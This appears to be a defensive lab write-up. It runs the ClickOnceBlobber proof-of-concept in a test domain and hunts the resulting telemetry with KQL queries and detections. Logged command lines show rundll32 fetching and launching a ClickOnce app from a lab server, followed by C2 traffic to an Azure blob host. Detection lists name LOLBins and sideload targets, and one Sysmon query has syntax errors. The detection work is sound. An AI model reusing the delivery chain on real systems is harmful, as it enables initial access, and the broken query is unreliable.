# How do I use this?
Go to https://dataexplorer.azure.com, then create a free ADX cluster account and a new database. Copy the [init.kql](https://github.com/ksyeung/DetLabs/blob/main/fsquirt_Living_off_the_Land/init.kql) data in this folder and paste it into the ADX web UI query window. This will create the required tables, ASIM parsers, helper functions, and start ingestion of the telemetry (WindowsEvent[...].parquet, etc).

# Synopsis
This simple attack simulation executes [ClickOnceBlobber](https://github.com/dazzyddos/ClickOnceBlobber) by [dazzyddos](https://x.com/dazzyddos), a proof-of-concept tool that weaponizes signed .NET ClickOnce applications for initial access through AppDomainManager injection and DLL hijacking. Defenders may want to monitor the `dfsvc.exe` process and the ClickOnce application cache at `%LOCALAPPDATA%\Apps\2.0\`. Pentest Laboratories has an excellent article covering the mechanics of this named [AppDomainManager Injection and Detection](https://pentestlaboratories.com/2020/05/26/appdomainmanager-injection-and-detection). Note that this article is now nearly six years old, and 1) is primarily useful for understanding the underlying injection technique, 2) Sysmon now handles .NET assembly load telemetry differently, and 3) there are better detections available now.

The MITRE technique page and its references provide essential background; if you're unfamiliar with the technique, I highly recommend reading [T1127.002 Trusted Developer Utilities Proxy Execution: ClickOnce](https://attack.mitre.org/techniques/T1127/002)  and the Pentest Laboratories article.

Two recent campaigns demonstrate active exploitation. The [OneClik](https://www.bleepingcomputer.com/news/security/oneclik-attacks-use-microsoft-clickonce-and-aws-to-target-energy-sector/) exercise documented by Trellix in mid 2025 targeted the energy sector using ClickOnce manifests hosted on Azure with AppDomainManager hijacking and Golang backdoors. This is the same injection technique that ClickOnceBlobber implements. In March 2026, Arctic Wolf reported that the India-nexus actor SloppyLemming delivered ClickOnce manifests via spearphishing PDFs against government targets. See their article [SloppyLemming Deploys BurrowShell and Rust-Based RAT to Target Pakistan and Bangladesh](https://arcticwolf.com/resources/blog/sloppylemming-deploys-burrowshell-and-rust-based-rat-to-target-pakistan-and-bangladesh/).

---

I first attempted this simulation with the Kusto.Explorer ClickOnce application, but I was unable to proceed due to more stringent validation of Microsoft-signed applications. I instead grabbed a signed ClickOnce application named `TestClickOnce` from the website [ClickOnce Get](https://clickonceget.azurewebsites.net). See the GitHub page for ClickOnceBlobber for detailed instructions on building and deployment.

# ClickOnceBlobber execution
First, lets identify process execution:
```kql
DeviceProcessEvents
| where InitiatingProcessFileName =~ "dfsvc.exe"
| project
	Timestamp, DeviceName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, InitiatingProcessParentFileName
```

Output:

| Timestamp                | DeviceName                   | FileName          | FolderPath                                                                                                                  | ProcessCommandLine  | InitiatingProcessFileName | InitiatingProcessFolderPath                               | InitiatingProcessCommandLine                                                                                            | InitiatingProcessParentFileName |
| ------------------------ | ---------------------------- | ----------------- | --------------------------------------------------------------------------------------------------------------------------- | ------------------- | ------------------------- | --------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------- | ------------------------------- |
| 2026-03-06 17:54:59.335Z | jd-win11-22h2-1.ludus.domain | dfsvc.exe         | C:\Windows\Microsoft.NET\Framework64\v4.0.30319\dfsvc.exe                                                                   | "dfsvc.exe"         | rundll32.exe              | c:\windows\system32\rundll32.exe                          | "rundll32.exe" "C:\Windows\System32\dfshim.dll",ShOpenVerbApplication http://10.2.20.169:8080/TestClickOnce.application | msedge.exe                      |
| 2026-03-06 17:55:10.954Z | jd-win11-22h2-1.ludus.domain | TestClickOnce.exe | C:\Users\domainuser\AppData\Local\Apps\2.0\PZ132NJ0.HTL\ZK0RZMJV.YEM\test..tion_0000000000000000_0001.0000_d41ad6f01d939... | "TestClickOnce.exe" | dfsvc.exe                 | c:\windows\microsoft.net\framework64\v4.0.30319\dfsvc.exe | "dfsvc.exe"                                                                                                             | rundll32.exe                    |

Looks like the user ran the ClickOnce application with Edge. Note the `FolderPath`. There are other known artifacts for ClickOnce deployments. Let's find them:

```kql
Corelight_CL
| where log_type == "http"
| extend uri = tostring(ParsedMessage.uri),
         http_host = tostring(ParsedMessage["host"]),
         method = tostring(ParsedMessage.method),
         user_agent = tostring(ParsedMessage.user_agent),
         status_code = toint(ParsedMessage.status_code),
         orig_h = tostring(ParsedMessage["id.orig_h"]),
         resp_h = tostring(ParsedMessage["id.resp_h"])
| where uri has_any (".application", ".manifest", ".deploy", ".exe.config")
| project
	TimeGenerated, method, orig_h, resp_h, uri, status_code, user_agent
```

Output:

| TimeGenerated            | method | orig_h     | resp_h      | uri                                                                      | status_code | user_agent                                                                                                                    |
| ------------------------ | ------ | ---------- | ----------- | ------------------------------------------------------------------------ | ----------- | ----------------------------------------------------------------------------------------------------------------------------- |
| 2026-03-06T17:54:56.075Z | GET    | 10.2.10.21 | 10.2.20.169 | /TestClickOnce.application                                               | 304         | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0 |
| 2026-03-06T17:55:01.026Z | GET    | 10.2.10.21 | 10.2.20.169 | /TestClickOnce.application                                               | 200         |                                                                                                                               |
| 2026-03-06T17:55:01.174Z | GET    | 10.2.10.21 | 10.2.20.169 | /TestClickOnce.application                                               | 200         |                                                                                                                               |
| 2026-03-06T17:55:01.200Z | GET    | 10.2.10.21 | 10.2.20.169 | /Application Files/TestClickOnce_1_0_0_0/TestClickOnce.exe.manifest      | 200         |                                                                                                                               |
| 2026-03-06T17:55:06.550Z | GET    | 10.2.10.21 | 10.2.20.169 | /Application Files/TestClickOnce_1_0_0_0/TestClickOnceHelper.dll.deploy  | 200         |                                                                                                                               |
| 2026-03-06T17:55:06.757Z | GET    | 10.2.10.21 | 10.2.20.169 | /Application Files/TestClickOnce_1_0_0_0/TestClickOnce.pdb.deploy        | 200         |                                                                                                                               |
| 2026-03-06T17:55:06.769Z | GET    | 10.2.10.21 | 10.2.20.169 | /Application Files/TestClickOnce_1_0_0_0/TestClickOnce.exe.config.deploy | 200         |                                                                                                                               |
| 2026-03-06T17:55:06.779Z | GET    | 10.2.10.21 | 10.2.20.169 | /Application Files/TestClickOnce_1_0_0_0/TestClickOnce.exe.deploy        | 200         |                                                                                                                               |

What was loaded by the parent process?

```kql
DeviceImageLoadEvents
| where FolderPath has @"\AppData\Local\Apps\2.0\"
| project
    Timestamp, FileName, FolderPath, SHA256, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine
```

Output:

|Timestamp|FileName|FolderPath|SHA256|InitiatingProcessFileName|InitiatingProcessCommandLine|
|---|---|---|---|---|---|
|2026-03-06T17:55:11.022Z|TestClickOnce.exe|C:\Users\domainuser\AppData\Local\Apps\2.0...\TestClickOnce.exe|4008b8...cc02|testclickonce.exe|"TestClickOnce.exe"|
|2026-03-06T17:55:12.251Z|TestClickOnceHelper.dll|C:\Users\domainuser\AppData\Local\Apps\2.0...\TestClickOnceHelper.dll|60e758...cc02|testclickonce.exe|"TestClickOnce.exe"|

Unfortunately, we don't have the [FileProfile() function](https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-fileprofile-function) from Defender XDR, where we could get enriched data like `SignatureState` or `GlobalPrevalence`. We can look for the signature information with Sysmon Event ID 7, but there's no way to find the number of instances of this file hash globally by other means. Let's do the former now:

```kql
WindowsEvent
| where Provider == "Microsoft-Windows-Sysmon" and EventID == 7
| extend Image = tostring(EventData.Image),
         ImageLoaded = tostring(EventData.ImageLoaded)
         Signed = tostring(EventData.Signed),
         SignatureStatus = tostring(EventData.SignatureStatus)
         Hashes = tostring(EventData.Hashes)
| where Image endswith "TestClickOnce.exe"
| where ImageLoaded has @"\AppData\Local\Apps\2.0\"
| project TimeGenerated, Computer, ImageLoaded, Signed, SignatureStatus, Hashes
```

Output:

|TimeGenerated|Computer|ImageLoaded|Signed|SignatureStatus|SHA256|IMPHASH|
|---|---|---|---|---|---|---|
|2026-03-06T17:55:11.053Z|JD-WIN11-22H2-1.ludus.domain|...\TestClickOnce.exe|false|Unavailable|4008B8...CB9E10|F34D5F...A744|
|2026-03-06T17:55:12.299Z|JD-WIN11-22H2-1.ludus.domain|...\TestClickOnceHelper.dll|false|Unavailable|60E758...CBCC02|DAE02F...42DAA|
|2026-03-06T17:55:12.300Z|JD-WIN11-22H2-1.ludus.domain|...\TestClickOnceHelper.dll|false|Unavailable|60E758...CBCC02|DAE02F...42DAA|

Sysmon couldn't find a valid Authenticode signature for our ProxyBlob Agent DLL, `TestClickOnceHelper.dll`. The query limited results to images loaded from the ClickOnce cache, but you can also look at the .NET/CLR assembly loads if you remove the line `| where ImageLoaded has @"\AppData\Local\Apps\2.0\"`. 


Separately, note that a ClickOnce application can carry a manifest-signing certificate while the underlying binaries can have their own Authenticode signatures. `ClickOnceBlobber` rebuilds the deployment package to inject the malicious `TestClickOnceHelper.dll` and `.exe.config` file that enables AppDomainManager hijacking. This process replaces the original manifest signature with a new one. The website where I obtained this ClickOnce app publishes the [manifest certificate](https://clickonceget.azurewebsites.net/app/TestClickOnce/cert/TestClickOnce.cer).


Moving on, while we don't have `GlobalPrevalence` from `FileProfile()`, we can still baseline the use of ClickOnce and ClickOnce applications in the environment.

```kql
let ClickOnceDeployments = 
    DeviceProcessEvents
    | where InitiatingProcessFileName =~ "dfsvc.exe"
    | where FolderPath has @"\AppData\Local\Apps\2.0\"
    | summarize 
        DeployedApps = make_set(FileName, 10),
        DeployedPaths = make_set(FolderPath, 10),
        DeployedHashes = make_set(SHA256, 10),
        DeployedCommandLines = make_set(ProcessCommandLine, 10),
        FirstDeployed = min(Timestamp),
        LastDeployed = max(Timestamp),
        DeploymentCount = count()
        by DeviceName;
let DfsvcExecutions =
    DeviceProcessEvents
    | where FileName =~ "dfsvc.exe"
    | summarize 
        ExecutionCount = count(),
        FirstSeen = min(Timestamp),
        LastSeen = max(Timestamp),
        ParentProcesses = make_set(InitiatingProcessFileName, 10),
        ParentCommandLines = make_set(InitiatingProcessCommandLine, 10),
        DfsvcPaths = make_set(FolderPath, 10),
        DfsvcCommandLines = make_set(ProcessCommandLine, 10)
        by DeviceName;
DfsvcExecutions
| join kind=leftouter ClickOnceDeployments on DeviceName
| project 
    DeviceName,
    // What launched dfsvc.exe?
    ParentProcesses, ParentCommandLines,
    // dfsvc.exe
    DfsvcPaths, DfsvcCommandLines, ExecutionCount, FirstSeen, LastSeen,
    // What did dfsvc.exe deploy?
    DeployedApps, DeployedHashes, DeployedCommandLines, DeploymentCount, FirstDeployed, LastDeployed
```

Output:

| DeviceName                   | ExecutionCount | FirstSeen                | LastSeen                 | ParentProcesses  | DeploymentCount | DeployedApps          | DeployedHashes                                                       | DeployedCommandLines  | FirstDeployed            | LastDeployed             |
| ---------------------------- | -------------- | ------------------------ | ------------------------ | ---------------- | --------------- | --------------------- | -------------------------------------------------------------------- | --------------------- | ------------------------ | ------------------------ |
| jd-win11-22h2-1.ludus.domain | 1              | 2026-03-06T17:54:59.335Z | 2026-03-06T17:54:59.335Z | ["rundll32.exe"] | 1               | ["TestClickOnce.exe"] | ["4008b8cdc907ed469b5f044c80ad808f9797e0f4e5d3ff3b38850372d2cb9e10"] | ["TestClickOnce.exe"] | 2026-03-06T17:55:10.955Z | 2026-03-06T17:55:10.955Z |

Since this is a lab env, these are predictable results.

<br>

To confirm all of the files that were created on disk:

```kql
DeviceFileEvents
| where DeviceName == "jd-win11-22h2-1.ludus.domain"
| where FolderPath has @"\AppData\Local\Apps\2.0\"
| project 
    Timestamp, ActionType, FileName, FolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine, SHA256
```

Output:

| Timestamp                | ActionType  | FileName                 | FolderPath                                                                                                                                                | InitiatingProcessFileName | InitiatingProcessCommandLine | SHA256                                                           |
| ------------------------ | ----------- | ------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------- | ---------------------------- | ---------------------------------------------------------------- |
| 2026-03-06T17:55:07.433Z | FileCreated | TestClickOnceHelper.dll  | C:\Users\domainuser\AppData\Local\Apps\2.0\PZ132NJ0.HTL\ZK0RZMJV.YEM\test...exe_0000000000000000_0001.0000_none_bf35979fafd71f40\TestClickOnceHelper.dll  | dfsvc.exe                 | "dfsvc.exe"                  | 60e7585f6b1e40dad7373032073918ccf91d4d2a7cbc10c6288fb3e12acbcc02 |
| 2026-03-06T17:55:07.448Z | FileCreated | TestClickOnce.exe.config | C:\Users\domainuser\AppData\Local\Apps\2.0\PZ132NJ0.HTL\ZK0RZMJV.YEM\test...exe_0000000000000000_0001.0000_none_bf35979fafd71f40\TestClickOnce.exe.config | dfsvc.exe                 | "dfsvc.exe"                  | d1f60245d2a6f81ecffb77fcb50c632d5cefc3848e2f131d90f1b41b28d9eb55 |
| 2026-03-06T17:55:07.484Z | FileCreated | TestClickOnce.exe        | C:\Users\domainuser\AppData\Local\Apps\2.0\PZ132NJ0.HTL\ZK0RZMJV.YEM\test..tion_0000000000000000_0001.0000_d41ad6f01d939c50\TestClickOnce.exe             | dfsvc.exe                 | "dfsvc.exe"                  | 4008b8cdc907ed469b5f044c80ad808f9797e0f4e5d3ff3b38850372d2cb9e10 |

We've deduplicated the results for clarity (there were two results each for the 
`.dll` and `.exe.config` files, possibly due to ClickOnce file staging or MDE's treatment of rename/move operations as `FileCreated` events).

<br>

Did this app phone home?

```kql
_ASim_NetworkSession
| where ParentProcessName == "dfsvc.exe"
| where SrcProcessName == "testclickonce.exe"
| project
    TimeGenerated, EventProduct, DvcHostname, User, SrcProcessName, SrcProcessCommandLine, ParentProcessName, InitiatingProcessFolderPath, InitiatingProcessSHA256, DstIpAddr, DstPortNumber, DstFQDN, NetworkProtocol, NetworkDirection, EventResult
```

Output:

| TimeGenerated            | EventProduct               | DvcHostname     | User             | SrcProcessName    | SrcProcessCommandLine | ParentProcessName | InitiatingProcessFolderPath                                                                                                                   | InitiatingProcessSHA256                                          | DstIpAddr      | DstPortNumber | DstFQDN                          | NetworkProtocol | NetworkDirection | EventResult |
| ------------------------ | -------------------------- | --------------- | ---------------- | ----------------- | --------------------- | ----------------- | --------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------- | -------------- | ------------- | -------------------------------- | --------------- | ---------------- | ----------- |
| 2026-03-06T17:55:14.595Z | M365 Defender for Endpoint | jd-win11-22h2-1 | ludus\domainuser | testclickonce.exe | "TestClickOnce.exe"   | dfsvc.exe         | c:\users\domainuser\appdata\local\apps\2.0\pz132nj0.htl\zk0rzmjv.yem\test..tion_0000000000000000_0001.0000_d41ad6f01d939c50\testclickonce.exe | 4008b8cdc907ed469b5f044c80ad808f9797e0f4e5d3ff3b38850372d2cb9e10 | 20.209.154.134 | 443           | 9082489234.blob.core.windows.net | TCP             | Outbound         | Success     |

Mehmet Ergene writes in [Querying Azure Resource Graph Without Limits Using KQL](https://academy.bluraven.io/blog/querying-azure-resource-graph-without-limits-using-kql) about creating a whitelist of Azure Storage accounts in your environment for use with threat hunting queries. This would also be very helpful for detecting potential C2 and data exfiltration if you use Azure Storage in your environment. With the help of Suricata, we can catch C2 traffic with an Azure Blob Storage account:

```kql
Suricata_CL
| where EventType == "tls"
| where tostring(EventData.tls.sni) has "blob.core.windows.net"
| extend SNI = tostring(EventData.tls.sni),
    JA3 = tostring(EventData.tls.ja3.hash),
    JA3S = tostring(EventData.tls.ja3s.hash)
| project TimeGenerated, SrcIp, SrcPort, DestIp, DestPort, SNI, JA3, JA3S
```

Output:

| TimeGenerated            | SrcIp      | SrcPort | DestIp         | DestPort | SNI                              | JA3                              | JA3S                             |
| ------------------------ | ---------- | ------- | -------------- | -------- | -------------------------------- | -------------------------------- | -------------------------------- |
| 2026-03-05T18:49:51.300Z | 10.2.10.21 | 57005   | 20.209.154.134 | 443      | 9082489234.blob.core.windows.net | 6ad69cecca55b3321a3261b1ae4aaab1 | 15af977ce25de452b96affa2addb1036 |

While we're at it, lets aggregate all network connections from ClickOnce cache apps and `dfsvc.exe` according to MDE:

```kql
DeviceNetworkEvents
| where InitiatingProcessFolderPath has @"\AppData\Local\Apps\2.0\" or InitiatingProcessFileName == "dfsvc.exe"
| project
    Timestamp, ActionType, RemoteIP, RemotePort, RemoteUrl, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, Protocol
```

Output:

|Timestamp|ActionType|RemoteIP|RemotePort|RemoteUrl|InitiatingProcessFileName|InitiatingProcessFolderPath|Protocol|
|---|---|---|---|---|---|---|---|
|2026-03-06T17:55:01.016Z|ConnectionSuccess|10.2.20.169|8080||dfsvc.exe|c:\windows\microsoft.net\framework64\v4.0.30319\dfsvc.exe|Tcp|
|2026-03-06T17:55:01.164Z|ConnectionSuccess|10.2.20.169|8000||dfsvc.exe|c:\windows\microsoft.net\framework64\v4.0.30319\dfsvc.exe|Tcp|
|2026-03-06T17:55:14.595Z|ConnectionSuccess|20.209.154.134|443|9082489234.blob.core.windows.net|testclickonce.exe|...\TestClickOnce.exe|Tcp|

The first two rows show the ClickOnce deployment service `dfsvc.exe` connecting to the staging server at `10.2.20.169` on ports `8080` and `8000` to retrieve the `.application` manifest and `.deploy` payloads. This matches the Zeek HTTP logs from earlier showing the GET requests for the manifest and deploy files.

The last row shows C2 activity where `testclickonce.exe` reaches out to `9082489234.blob.core.windows.net` over port 443.

# Detections
No legitimate ClickOnce deployment should create a `.exe.config` in the cache following installation:
```kql
DeviceFileEvents
| where InitiatingProcessFileName == "dfsvc.exe"
| where InitiatingProcessVersionInfoCompanyName == "Microsoft Corporation"
| where FolderPath has @"\AppData\Local\Apps\2.0\"
| where FileName endswith ".exe.config"
| project 
    Timestamp, ActionType, DeviceName, RequestAccount = strcat(RequestAccountDomain, "\\", RequestAccountName), InitiatingProcessFolderPath, FolderPath, FileName
```

Output:

| Timestamp                    | ActionType  | DeviceName                   | RequestAccount   | InitiatingProcessFolderPath                               | FolderPath                                                                                                                                                | FileName                 |
| ---------------------------- | ----------- | ---------------------------- | ---------------- | --------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------ |
| 2026-03-05T20:30:38.2694273Z | FileCreated | jd-win11-22h2-1.ludus.domain | ludus\domainuser | c:\windows\microsoft.net\framework64\v4.0.30319\dfsvc.exe | C:\Users\domainuser\AppData\Local\Apps\2.0\68GOJRYE.ZQP\L8QAHERJ.XQ0\test...exe_0000000000000000_0001.0000_none_bf35979fafd71f40\TestClickOnce.exe.config | TestClickOnce.exe.config |
| 2026-03-05T20:30:38.2711574Z | FileCreated | jd-win11-22h2-1.ludus.domain | ludus\domainuser | c:\windows\microsoft.net\framework64\v4.0.30319\dfsvc.exe | C:\Users\domainuser\AppData\Local\Apps\2.0\68GOJRYE.ZQP\L8QAHERJ.XQ0\test..tion_0000000000000000_0001.0000_d41ad6f01d939c50\TestClickOnce.exe.config      | TestClickOnce.exe.config |

<br>

This detection catches `dfsvc.exe` launched by a browser or `rundll32.exe` with a command line referencing an external URL, which is distinct from more common, legitimate enterprise deployments that reference UNC paths or local file URIs. Combined with the baselining detection from the analysis section, this would cover the vector from the SloppyLemming campaign and our ClickOnceBlobber simulation.

```kql
let SuspiciousParents = dynamic([
    "msedge.exe", "chrome.exe", "firefox.exe", "iexplore.exe", "brave.exe",
    "winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe",
    "powershell.exe", "cmd.exe", "mshta.exe", "wscript.exe", "cscript.exe"
]);
_ASim_ProcessCreate
| where TargetProcessName endswith "dfsvc.exe"
| where ActingProcessName in~ (SuspiciousParents)
    or (ActingProcessName =~ "rundll32.exe" 
        and ActingProcessCommandLine has "dfshim.dll" 
        and ActingProcessCommandLine has_any ("http://", "https://"))
| project
    TimeGenerated, Dvc, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetProcessCommandLine
```

<br>

SloppyLemming doesn't rely solely on AppDomainManager injection via `dfsvc.exe`. After the ClickOnce manifest delivers the payload, a DLL sideloading package is dropped with a legitimate .NET binary (`NGGenTask.exe` or `phoneactivate.exe`) paired with a malicious loader DLL `mscorsvc.dll`. This happens after ClickOnce deployment and  outside of the `Apps\2.0` cache. Given this, we could look for a legitimate Microsoft binary loading unsigned DLLs from a user-writable path:

```
let SideloadTargets = dynamic([
    "ngentask.exe", "phoneactivate.exe", "msbuild.exe",
    "installutil.exe", "regsvcs.exe", "regasm.exe"
]);
WindowsEvent
| where Provider == "Microsoft-Windows-Sysmon" and EventID == 7
| extend Image = tostring(EventData.Image),
         ImageLoaded = tostring(EventData.ImageLoaded),
         Signed = tostring(EventData.Signed),
         SignatureStatus = tostring(EventData.SignatureStatus),
         Hashes = tostring(EventData.Hashes)
| where Image has_any (SideloadTargets)
| where ImageLoaded !startswith @"C:\Windows\"
      and ImageLoaded !startswith @"C:\Program Files\"
      and ImageLoaded !startswith @"C:\Program Files (x86)\"
| project TimeGenerated, Computer, Image, ImageLoaded, Signed, SignatureStatus, Hashes
```

We could also look for `NGenTask.exe` or `phoneactivate.exe` execution from a user-writable directory:
```kql
_ASim_ProcessCreate
| where TargetProcessName in~ ("ngentask.exe", "phoneactivate.exe")
| where TargetProcessCurrentDirectory !startswith @"C:\Windows\"
      and TargetProcessCurrentDirectory !startswith @"C:\Program Files"
| project
    TimeGenerated, Dvc, ActorUsername,
    TargetProcessName, TargetProcessCommandLine,
    ActingProcessName, ActingProcessCommandLine,
    TargetProcessCurrentDirectory
```

These detections have many gaps when you look at other uses of ClickOnce in the wild:

- The `OneClik` exercise by Trellix hides their C2 behind CloudFront, API Gateway, and lambda. 
- SloppyLemming uses more than 100 Cloudflare Workers domains and the BurrowShell traffic is disguised as Windows Update comms. 
- The Acronis research identifies use of ClickOnce runners that connect directly to a ScreenConnect server to fetch components.

I leave further detection engineering for those campaigns as an exercise for the reader. There are many references below if you're interested in more research on ClickOnce abuse.

---

References:
Trellix, [OneClik: A ClickOnce-Based Red Team Campaign Simulating APT Tactics in Energy Infrastructure](https://www.trellix.com/blogs/research/oneclik-a-clickonce-based-red-team-campaign-simulating-apt-tactics-in-energy-infrastructure)

Arctic Wolf, [SloppyLemming Deploys BurrowShell and Rust-Based RAT to Target Pakistan and Bangladesh](https://arcticwolf.com/resources/blog/sloppylemming-deploys-burrowshell-and-rust-based-rat-to-target-pakistan-and-bangladesh)

Acronis, [Trojanized ScreenConnect installers evolve, dropping multiple RATs on a single machine](https://www.acronis.com/en/tru/posts/trojanized-screenconnect-installers-evolve-dropping-multiple-rats-on-a-single-machine)

Hunt.io, [AsyncRAT Campaigns Uncovered: How Attackers Abuse ScreenConnect and Open Directories](https://hunt.io/blog/asyncrat-screenconnect-open-directory-campaigns)

Pentest Laboratories, [AppDomainManager Injection and Detection](https://pentestlaboratories.com/2020/05/26/appdomainmanager-injection-and-detection)

Mehmet Ergene, [Querying Azure Resource Graph Without Limits Using KQL](https://academy.bluraven.io/blog/querying-azure-resource-graph-without-limits-using-kql)

Cloudflare CloudForce One, [Unraveling SloppyLemming's Operations Across South Asia](https://www.cloudflare.com/cloudforce-one/research/unraveling-sloppylemmings-operations-across-south-asia/)

QiAnXin, [APT-Q-14 Group Combines 0day and ClickOnce Technology to Carry Out Espionage Activities](https://ti.qianxin.com/blog/articles/apt-q-14-group-combines-0day-and-clickonce-technology-to-carry-out-espionage-activities-en/)

Microsoft, [ClickOnce Security and Deployment](https://learn.microsoft.com/en-us/visualstudio/deployment/clickonce-security-and-deployment)

MITRE, [Trusted Developer Utilities Proxy Execution: ClickOnce](https://attack.mitre.org/techniques/T1127/002)

[ClickOnceBlobber](https://github.com/dazzyddos/ClickOnceBlobber)

[ClickOnceGet](https://clickonceget.azurewebsites.net)

[FileProfile() function](https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-fileprofile-function)

[Bolthole](https://github.com/rvrsh3ll/Bolthole)
